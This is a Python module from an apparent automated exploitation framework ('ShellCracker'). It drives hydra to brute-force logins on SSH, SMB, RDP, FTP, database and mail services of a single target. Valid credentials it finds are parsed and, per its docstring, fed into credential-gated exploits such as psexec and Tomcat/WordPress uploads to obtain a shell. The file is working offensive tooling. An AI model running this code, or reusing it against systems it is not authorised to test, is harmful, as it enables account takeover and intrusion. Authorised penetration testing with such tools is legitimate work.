"""Credential brute-forcing with hydra (the optional ``bruteforce`` phase).

The ``credentials`` phase uses Metasploit's login scanners with small built-in
lists. This module adds a heavier, wordlist-driven pass with ``hydra`` against
the login-capable services on the single target, because on real boxes a valid
credential is often the shortest path to a shell -- and, once found, it is fed
back into the engine, which reuses it across every service and unlocks the
credential-gated exploits (psexec, Tomcat/WordPress upload, DB payloads).

hydra is optional: if it is not installed the phase is skipped with a note.
Parallelism is kept modest (``tasks``) so this stays a credential check, not a
denial-of-service hammer. Only the single provided target is ever touched.
"""

from __future__ import annotations

import logging
import os
import re
import tempfile

from . import tools
from .recon import Service
from .strategy import (
    _COMMON_PASSWORDS, _COMMON_USERS, _SERVICE_PASSWORDS, _SERVICE_USERS, Finding,
)

logger = logging.getLogger("ShellCracker.bruteforce")

# Attack category -> hydra service name. Only protocols hydra handles cleanly
# without extra per-target arguments are listed (web/http forms need a path and
# are left to the dedicated web tooling).
_HYDRA_SERVICE: dict[str, str] = {
    "ssh": "ssh",
    "ftp": "ftp",
    "telnet": "telnet",
    "smb": "smb",
    "mysql": "mysql",
    "mssql": "mssql",
    "postgres": "postgres",
    "vnc": "vnc",
    "rdp": "rdp",
    "pop3": "pop3",
    "imap": "imap",
    "snmp": "snmp",
}

# hydra prints: "[22][ssh] host: 10.0.0.5  login: root  password: toor"
# Match within a single line only ([ \t], never \n) so an empty password does
# not greedily swallow a token from the following line.
_HIT_RE = re.compile(
    r"\[\d+\]\[[^\]]+\][ \t]+host:[ \t]*\S+[ \t]+"
    r"login:[ \t]*(\S*)[ \t]+password:[ \t]*(\S*)",
    re.I,
)


def parse_hydra(text: str) -> list[tuple[str, str]]:
    """Extract (user, password) pairs from hydra output."""
    pairs: list[tuple[str, str]] = []
    for m in _HIT_RE.finditer(text):
        pair = (m.group(1) or "", m.group(2) or "")
        if pair not in pairs:
            pairs.append(pair)
    return pairs


class BruteForcer:
    """Runs hydra credential attacks against one target's login services."""

    def __init__(self, target: str, config: dict) -> None:
        self.target = target
        cfg = (config or {}).get("bruteforce", {}) or {}
        self.enabled = bool(cfg.get("enabled", True))
        self.user_wordlist = cfg.get("user_wordlist")       # optional file path
        self.pass_wordlist = cfg.get("pass_wordlist")       # optional file path
        self.extra_users = list(cfg.get("extra_users", []) or [])
        self.extra_passwords = list(cfg.get("extra_passwords", []) or [])
        self.tasks = int(cfg.get("tasks", 8))               # hydra -t (modest)
        self.timeout = int(cfg.get("timeout", 300))         # per service, seconds
        self.stop_on_success = bool(cfg.get("stop_on_first_valid", True))

    # -- wordlist materialisation -------------------------------------------
    def _userpass_files(self, category: str) -> tuple[str, str, list[str]]:
        """Return (user_file, pass_file, tempfiles) for a category.

        A configured wordlist file is used verbatim; otherwise a temp file is
        written from the built-in + service-specific + extra lists.
        """
        tmp: list[str] = []

        if self.user_wordlist and os.path.exists(self.user_wordlist):
            ufile = self.user_wordlist
        else:
            users = list(dict.fromkeys(
                _SERVICE_USERS.get(category, []) + _COMMON_USERS + self.extra_users
            ))
            ufile = self._write_tmp("sc_hydra_u_", users)
            tmp.append(ufile)

        if self.pass_wordlist and os.path.exists(self.pass_wordlist):
            pfile = self.pass_wordlist
        else:
            passwords = list(dict.fromkeys(
                _SERVICE_PASSWORDS.get(category, []) + _COMMON_PASSWORDS
                + self.extra_passwords
            ))
            pfile = self._write_tmp("sc_hydra_p_", passwords)
            tmp.append(pfile)

        return ufile, pfile, tmp

    @staticmethod
    def _write_tmp(prefix: str, lines: list[str]) -> str:
        fd, path = tempfile.mkstemp(prefix=prefix, suffix=".txt")
        with os.fdopen(fd, "w", encoding="utf-8") as fh:
            fh.write("\n".join(lines) + "\n")
        return path

    # -- one service ---------------------------------------------------------
    def brute_service(self, category: str, svc: Service) -> list[Finding]:
        """Run hydra against one login service; return credential findings."""
        hydra_svc = _HYDRA_SERVICE.get(category)
        if not hydra_svc:
            return []
        if not tools.have("hydra"):
            logger.info("  [atlandi] hydra kurulu degil.")
            return []

        ufile, pfile, tmp = self._userpass_files(category)
        argv = [
            "hydra", "-I",                         # ignore any restore file
            "-L", ufile, "-P", pfile,
            "-t", str(max(1, min(self.tasks, 16))),  # bounded parallelism
            "-s", str(svc.port),
        ]
        if self.stop_on_success:
            argv.append("-f")                      # stop after first valid pair
        argv += [self.target, hydra_svc]

        try:
            res = tools.run(argv, timeout=self.timeout)
        finally:
            for p in tmp:
                try:
                    os.remove(p)
                except OSError:
                    pass

        if not res.ok and not res.stdout:
            return []
        findings: list[Finding] = []
        for user, pw in parse_hydra(res.text):
            findings.append(Finding(
                key="creds", value=(user, pw), port=svc.port, category=category,
                detail=f"hydra: {category}:{svc.port} {user}:{pw or '<bos>'}",
            ))
            logger.info("  hydra buldu: %s:%s %s:%s",
                        category, svc.port, user, pw or "<bos>")
        return findings

    def tool_status(self) -> bool:
        """Whether hydra is installed."""
        return tools.have("hydra")
